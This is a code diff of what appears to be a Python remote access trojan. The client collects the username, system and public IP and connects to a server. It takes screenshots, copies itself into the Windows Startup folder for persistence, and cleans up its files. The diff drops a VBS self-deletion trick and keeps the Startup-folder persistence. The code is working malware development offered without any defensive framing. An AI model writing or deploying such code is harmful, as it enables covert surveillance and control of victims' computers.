@@ -1,4 +1,4 @@
-import socket, subprocess, os, time, platform, sys, urllib.request, re, pyautogui
+import socket, subprocess, os, time, platform, sys, urllib.request, re, pyautogui, shutil
 from io import StringIO # Purpose: Python Interpreter (receiving output)
 
 # Socket Properties
@@ -15,7 +15,6 @@ appdata = os.environ["APPDATA"]
 username = os.getlogin()
 system = platform.system() + " " + platform.release()
 filename = __file__.split(".")[0] + ".exe"
-Startup_Path = f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/{filename}"
 
 try:
     Public_IP = urllib.request.urlopen("https://ident.me", timeout=30).read()
@@ -24,15 +23,9 @@ except (urllib.error.URLError, Exception):
 
 # Copy file to Startup folder
 try:
-    shutil.copyfile(f"{filename}", Startup_Path)
-    with open(appdata+"/configure.vbs", "w") as VBS_File:
-        VBS_File.write(f"Set del = CreateObject(\"Scripting.FileSystemObject\")\ndel.DeleteFile(\"{os.getcwd() + '/' + filename}\")")
-
-    subprocess.Popen(Startup_Path, shell=True); subprocess.Popen(appdata+"/configure.vbs", shell=True)
-    sys.exit(0)
-
-except (FileNotFoundError, Exception):
-    pass
+    shutil.copyfile(f"{filename}", f"C:/Users/{username}/AppData/Roaming/Microsoft"
+                     f"/Windows/Start Menu/Programs/Startup/{filename}")
+except: pass
 
 # Connect to Server
 def main():
@@ -67,10 +60,6 @@ def ClearFiles():
 
     if (os.path.isfile(appdata+"/screenshot.png")):
         os.remove(appdata+"/screenshot.png")
-    else: pass
-
-    if (os.path.isfile(appdata+"/configure.vbs")):
-        os.remove(appdata+"/configure.vbs")
     else: pass
 
 def MessageBox(message):
